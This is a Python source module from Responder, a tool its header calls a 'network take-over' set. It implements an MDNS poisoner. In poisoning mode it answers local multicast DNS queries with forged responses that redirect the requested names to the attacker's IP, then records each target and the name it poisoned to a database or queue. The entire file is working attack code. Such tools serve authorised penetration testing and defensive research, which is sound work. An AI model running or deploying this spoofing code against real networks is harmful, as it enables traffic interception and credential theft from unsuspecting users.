#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
import datetime
import sys

if (sys.version_info > (3, 0)):
    from socketserver import BaseRequestHandler
else:
    from SocketServer import BaseRequestHandler
from responder.packets import MDNS_Ans
from responder.utils import *


def Parse_MDNS_Name(data):
    try:
        if (sys.version_info > (3, 0)):
            data = data[12:]
            NameLen = data[0]
            Name = data[1:1 + NameLen]
            NameLen_ = data[1 + NameLen]
            Name_ = data[1 + NameLen:1 + NameLen + NameLen_ + 1]
            FinalName = Name + b'.' + Name_
            return FinalName.decode("latin-1")
        else:
            data = NetworkRecvBufferPython2or3(data[12:])
            NameLen = struct.unpack('>B', data[0])[0]
            Name = data[1:1 + NameLen]
            NameLen_ = struct.unpack('>B', data[1 + NameLen])[0]
            Name_ = data[1 + NameLen:1 + NameLen + NameLen_ + 1]
            return Name + '.' + Name_

    except IndexError:
        return None


def Poisoned_MDNS_Name(data):
    data = NetworkRecvBufferPython2or3(data[12:])
    return data[:len(data) - 5]


class MDNS(BaseRequestHandler):
    def handle(self):
        try:
            MADDR = "224.0.0.251"
            MPORT = 5353

            data, soc = self.request
            Request_Name = Parse_MDNS_Name(data)

            # Break out if we don't want to respond to this host
            if (not Request_Name) or (RespondToThisHost(self.client_address[0], Request_Name) is not True):
                return None

            if settings.Config.AnalyzeMode:  # Analyze Mode
                if Parse_IPV6_Addr(data):
                    # print(text('[Analyze mode: MDNS] Request by %-15s for %s, ignoring' % (color(self.client_address[0], 3), color(Request_Name, 3))))
                    SavePoisonersToDb({
                        'Poisoner': 'MDNS',
                        'SentToIp': self.client_address[0],
                        'ForName': Request_Name,
                        'AnalyzeMode': '1',
                    })
            else:  # Poisoning Mode
                if Parse_IPV6_Addr(data):

                    Poisoned_Name = Poisoned_MDNS_Name(data)
                    Buffer = MDNS_Ans(AnswerName=Poisoned_Name, IP=RespondWithIPAton())
                    Buffer.calculate()
                    # record the time prior to sending to get as CLOSE as possible
                    timenow = datetime.datetime.now(datetime.timezone.utc).timestamp()
                    soc.sendto(NetworkSendBufferPython2or3(Buffer), (MADDR, MPORT))

                    # print(color('[*] [MDNS] Poisoned answer sent to %-15s for name %s' % (self.client_address[0], Request_Name), 2, 1))
                    if self.server.tool_q != None:
                        target = self.client_address[0]
                        msg = {'poisoner': 'responder', 'target': target, 'timestamp': timenow,
                               'action_state': 'MDNS', 'request': Request_Name}
                        self.server.tool_q.put(msg)
                    else:
                        SavePoisonersToDb({
                            'Poisoner': 'MDNS',
                            'SentToIp': self.client_address[0],
                            'ForName': Request_Name,
                            'AnalyzeMode': '0',
                        })
        except Exception as e:
            if self.server.tool_q != None:
                error_msg = f'MDNS.py encountered an error {type(e)}: {e}'
                self.server.tool_q.put({'poisoner': 'responder', 'action_state': 'error', 'data': error_msg})
            raise